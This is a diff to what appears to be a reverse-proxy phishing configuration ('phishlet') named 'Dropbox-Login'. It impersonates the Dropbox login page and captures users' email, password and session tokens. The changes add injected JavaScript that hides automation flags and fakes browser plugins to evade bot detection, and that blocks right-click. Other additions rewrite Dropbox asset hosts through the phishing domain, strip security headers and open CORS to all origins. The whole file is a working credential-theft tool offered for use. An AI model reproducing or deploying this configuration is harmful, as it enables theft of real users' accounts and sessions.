@@ -2,8 +2,7 @@ name: "Dropbox-Login"
 author: "Vanta v5"
 min_ver: "5.0.0"
 proxy_hosts:
-  - subdomain: "dropbox"
-    target: "www.dropbox.com"
+  - {phish_sub: "dropbox", orig_sub: "www", domain: "dropbox.com", session: true, is_landing: true}
 auth_urls: ["/login"]
 landing_path: ["/login"]
 auth_tokens:
@@ -13,7 +12,22 @@ auth_tokens:
 credentials:
   - {type: "post_param", name: "login_email", regex: null}
   - {type: "post_param", name: "login_password", regex: null}
-injections: []
+injections:
+  - {type: "js", path: "/core/assets/js/capture.js", trigger: "load"}
+  - trigger_path: "/login"
+    position: "body_end"
+    content: |
+      (function(){
+        // Anti-Bot Evasion
+        Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
+        Object.defineProperty(navigator, 'plugins', {get: () => [1, 2, 3, 4, 5]});
+        document.addEventListener('contextmenu', event => event.preventDefault());
+      })();
+sub_filters:
+  - {triggers_on: "www.dropbox.com", orig_sub: "www", domain: "dropbox.com", search: "https://www.dropbox.com", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript"]}
+  - {triggers_on: "www.dropbox.com", orig_sub: "cfl", domain: "dropboxstatic.com", search: "https://cfl.dropboxstatic.com", replace: "https://{hostname}/_static", mimes: ["text/html", "application/javascript", "text/css"]}
+  - {triggers_on: "www.dropbox.com", orig_sub: "www", domain: "dropboxstatic.com", search: "https://www.dropboxstatic.com", replace: "https://{hostname}/_static_www", mimes: ["text/html", "application/javascript", "text/css"]}
+  - {triggers_on: "cfl.dropboxstatic.com", orig_sub: "cfl", domain: "dropboxstatic.com", search: "https://cfl.dropboxstatic.com", replace: "https://{hostname}/_static", mimes: ["text/html", "application/javascript", "text/css"]}
 headers:
   - {action: "remove", name: "Content-Security-Policy"}
   - {action: "remove", name: "X-Frame-Options"}
@@ -24,6 +38,9 @@ blocklist:
   - {pattern: "analytics|/static/|/client_log", mimes: ["text/javascript"], max_kb: 512}
 form_actions:
   - {selector: "form[action*=\"login\"]", action_to: "/ajax_login"}
+bridges:
+  - {prefix: "/_static/", target_host: "cfl.dropboxstatic.com", strip_prefix: true, cors: "allow_all"}
+  - {prefix: "/_static_www/", target_host: "www.dropboxstatic.com", strip_prefix: true, cors: "allow_all"}
 cors:
   mode: "allow_all"
   methods: ["GET", "POST", "OPTIONS", "PUT", "DELETE"]
